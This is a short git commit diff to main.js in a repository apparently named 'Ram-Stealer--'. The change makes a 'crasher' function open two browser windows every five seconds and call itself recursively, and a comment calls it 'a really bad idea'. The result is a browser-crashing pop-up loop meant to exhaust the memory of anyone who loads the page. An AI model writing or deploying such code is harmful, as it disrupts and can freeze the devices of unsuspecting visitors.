24f3316be06f9f08d2bab92a757f6d3f3aa97b5a
Clover Johnson <95094165+callmeclover@users.noreply.github.com>
2022-12-09 08:32:42 -0500

    Update main.js

--- main.js
+++ main.js
@@ -1,5 +1,8 @@
 function crasher() {
   setTimeout(() => {
   window.open("callmeclover.github.io/Ram-Stealer--/opener.html")
-})
+  window.open("callmeclover.github.io/Ram-Stealer--/opener.html")
+  // a really bad idea
+  crasher()
+}, 5000)
 }
